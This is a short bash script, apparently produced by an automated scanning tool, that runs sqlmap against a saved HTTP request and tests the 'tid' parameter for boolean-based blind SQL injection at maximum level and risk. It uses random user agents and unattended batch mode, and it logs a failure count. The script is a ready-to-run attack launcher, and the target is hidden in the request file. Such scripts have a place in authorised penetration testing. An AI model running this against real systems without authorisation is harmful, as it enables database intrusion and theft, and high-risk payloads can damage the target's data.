#!/usr/bin/env bash
set -u
cd "$(dirname "$0")"
if ! command -v sqlmap >/dev/null 2>&1; then
  echo "[ERROR] sqlmap was not found in PATH."
  echo "[HINT] Install sqlmap or add it to PATH, then rerun this script."
  exit 1
fi
echo "[INFO] SQLMap Request Mode"
echo "[INFO] WorkDir: $(pwd)"
echo
FAIL_COUNT=0
echo "[INFO] Request mode, 1 unique requests."
echo
printf '%s\n' '[RUN 1/1] sqlmap -r "sqlmap_requests/001_sql_injection_tid_3888037214562551033.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output/001_3888037214562551033" --force-ssl -p "tid" --technique=B'
sqlmap -r "sqlmap_requests/001_sql_injection_tid_3888037214562551033.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output/001_3888037214562551033" --force-ssl -p "tid" --technique=B || FAIL_COUNT=$((FAIL_COUNT+1))
echo
echo "[DONE] Request mode finished, FailCount=$FAIL_COUNT"
exit $FAIL_COUNT
